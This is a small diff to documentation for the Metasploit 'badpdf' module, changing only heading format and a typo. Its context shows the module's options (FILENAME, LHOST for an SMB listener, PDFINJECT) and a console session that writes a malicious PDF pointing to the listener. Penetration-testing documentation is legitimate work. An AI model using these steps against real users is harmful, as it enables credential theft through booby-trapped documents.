@@ -19,15 +19,15 @@ FoxIT after version 9.1 is no longer vulnerable.
 
 ## Options
 
-**FILENAME**
+### FILENAME
 This option allows you to customise the generated filename.
 This can be changed using set FILENAME test.pdf
 
-**LHOST**
+### LHOST
 This option allows you to set the IP address of the SMB Listener that the document points to
 This can be changed using set LHOST 192.168.1.25
 
-**PDFINJECT**
+### PDFINJECT
 This option allows you to inject the UNC code into an existing PDF document
 This can be changed using set PDFINJECT /path/to/file/pdf.pdf
 
@@ -85,7 +85,7 @@ msf auxiliary(fileformat/badpdf) > set pdfinject /root/Desktop/example.pdf
 pdfinject => /root/Desktop/example.pdf
 msf auxiliary(fileformat/badpdf) > exploit
 
-[+] Malicious file writen to /root/Desktop/example_malicious.pdf
+[+] Malicious file written to /root/Desktop/example_malicious.pdf
 [\*] Auxiliary module execution completed
 msf auxiliary(fileformat/badpdf) > 
  
